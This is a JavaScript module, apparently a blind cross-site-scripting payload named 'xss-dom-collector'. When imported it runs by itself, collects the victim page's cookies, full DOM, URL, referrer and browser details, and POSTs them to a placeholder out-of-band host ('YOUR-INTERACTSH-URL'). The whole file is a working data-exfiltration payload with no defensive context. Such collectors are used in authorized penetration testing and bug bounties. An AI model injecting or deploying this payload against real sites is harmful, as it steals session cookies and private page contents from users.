export async function collect() {
    const data = {
        collector: "xss-dom-collector",
        timestamp: new Date().toISOString(),

        // Execution context
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        hostname: location.hostname,
        pathname: location.pathname,
        search: location.search,
        hash: location.hash,

        // Document information
        title: document.title,
        referrer: document.referrer,
        domain: document.domain,

        // Cookies available to JavaScript.
        // HttpOnly cookies will NOT be present.
        cookies: document.cookie,

        // Browser information
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,

        // Frame information
        isTopLevel: window === window.top,

        // Complete serialized document
        dom: document.documentElement.outerHTML,

        // Potentially useful for tracing execution
        stack: new Error().stack
    };

    const body = new FormData();

    body.append("collector", data.collector);
    body.append("timestamp", data.timestamp);
    body.append("href", data.href);
    body.append("origin", data.origin);
    body.append("protocol", data.protocol);
    body.append("hostname", data.hostname);
    body.append("pathname", data.pathname);
    body.append("search", data.search);
    body.append("hash", data.hash);
    body.append("title", data.title);
    body.append("referrer", data.referrer);
    body.append("domain", data.domain);
    body.append("cookies", data.cookies);
    body.append("userAgent", data.userAgent);
    body.append("language", data.language);
    body.append("platform", data.platform);
    body.append("isTopLevel", String(data.isTopLevel));
    body.append("stack", data.stack || "");

    // The important one.
    body.append("dom", data.dom);

    await fetch("https://YOUR-INTERACTSH-URL", {
        method: "POST",
        body,
        mode: "no-cors",
        keepalive: true
    });
}

// Automatically collect when imported.
collect().catch(() => {});
